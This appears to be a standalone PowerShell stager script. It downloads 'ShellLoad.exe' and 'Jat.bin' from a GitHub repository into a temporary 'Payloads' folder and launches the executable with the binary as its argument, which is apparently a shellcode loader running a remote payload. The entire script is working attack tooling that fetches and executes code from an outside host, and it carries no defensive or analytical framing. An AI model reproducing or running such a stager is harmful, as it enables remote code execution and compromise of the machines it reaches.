# Define URLs for your files
$exeUrl = "https://github.com/Magturn/Bat/raw/refs/heads/main/ShellLoad.exe"
$binUrl = "https://github.com/Magturn/Bat/raw/refs/heads/main/Jat.bin"

# Create a temporary directory to store the payloads
$tempDir = "$env:TEMP\Payloads"
if (!(Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir | Out-Null
}

# Define local file paths
$exePath = Join-Path $tempDir "shellloader.exe"
$binPath = Join-Path $tempDir "coder.bin"

# Download shellloader.exe
Write-Host "Downloading shellloader.exe..."
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction Stop
} catch {
    Write-Error "Failed to download shellloader.exe: $_"
    exit
}

# Download coder.bin
Write-Host "Downloading coder.bin..."
try {
    Invoke-WebRequest -Uri $binUrl -OutFile $binPath -ErrorAction Stop
} catch {
    Write-Error "Failed to download coder.bin: $_"
    exit
}

# Execute shellloader.exe with coder.bin as an argument.
# This assumes that shellloader.exe accepts the binary file as a command-line parameter.
Write-Host "Launching shellloader.exe with coder.bin..."
try {
    Start-Process -FilePath $exePath -ArgumentList $binPath -ErrorAction Stop
} catch {
    Write-Error "Failed to execute shellloader.exe: $_"
}
